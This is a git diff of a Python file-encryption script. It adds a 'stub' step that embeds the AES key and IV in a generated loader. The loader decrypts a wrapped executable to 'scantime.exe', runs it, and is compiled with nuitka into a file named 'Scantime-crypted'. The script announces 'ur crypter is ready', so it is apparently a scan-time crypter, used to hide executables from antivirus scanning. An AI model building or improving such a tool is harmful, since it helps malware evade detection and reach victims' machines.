@@ -1,8 +1,8 @@
 import os
-import stat
 import platform
+import stat
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+from Crypto.Util.Padding import pad
 from colorama import Fore, Style
 
 
@@ -15,6 +15,7 @@ def generate_random_iv():
 
 
 def encrypt_file(input_file, output_file):
+    global key, iv
     key = generate_random_key(32)  # Generate a random 256-bit key
     iv = generate_random_iv()
     cipher = AES.new(key, AES.MODE_CBC, iv)
@@ -32,6 +33,47 @@ def encrypt_file(input_file, output_file):
     print(Fore.GREEN + "Encryption completed successfully.")
     print("Encryption Key: " + key.hex())
     print("Encryption IV: " + iv.hex() + Style.RESET_ALL)
+
+
+def stub(output_file):
+    print("Making the stub for u Please be patient")
+
+    with open(output_file+'.exe', 'rb') as f:
+        binary_data = f.read()
+
+    with open('stub.py', 'w') as python_file:
+        python_file.write(f"""from Crypto.Cipher import AES
+import subprocess
+import os
+
+# Get key and IV from user input
+key = r'{key.hex()}'
+key = bytes.fromhex(key)
+iv = r'{iv.hex()}'
+iv = bytes.fromhex(iv)
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+
+input_file = '{output_file}.exe'
+output_file = 'scantime.exe'
+
+file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), input_file)
+
+with open(file_path, 'rb') as f_in, open(output_file, 'wb') as f_out:
+    iv = f_in.read(16)  # Read the IV from the input file
+    while True:
+        encrypted_chunk = f_in.read(32)
+        if len(encrypted_chunk) == 0:
+            break
+        decrypted_chunk = cipher.decrypt(encrypted_chunk)
+        f_out.write(decrypted_chunk)
+
+subprocess.run('scantime.exe', shell=True)
+""")
+        os.system(f'nuitka --onefile --standalone --output-filename=Scantime-crypted --mingw64 --include-data-file={output_file}.exe={output_file}.exe stub.py')
+        print(
+            Fore.BLUE + 'ur good to go ur crypter is '
+                        'ready!!' + Style.RESET_ALL)
 
 
 def decrypt_file(input_file, output_file):
@@ -70,7 +112,6 @@ def display_menu():
     print("3. Quit" + Style.RESET_ALL)
 
 
-# Example usage
 while True:
     display_menu()
     choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL)
@@ -80,6 +121,7 @@ while True:
         output_file = input(Fore.YELLOW + "Enter the path of the output file: " + Style.RESET_ALL)
         encrypt_file(input_file, output_file)
         set_execution_permissions(output_file)
+        stub(output_file)
     elif choice == "2":
         input_file = input(Fore.YELLOW + "Enter the path of the input file: " + Style.RESET_ALL)
         output_file = input(Fore.YELLOW + "Enter the path of the output file: " + Style.RESET_ALL)
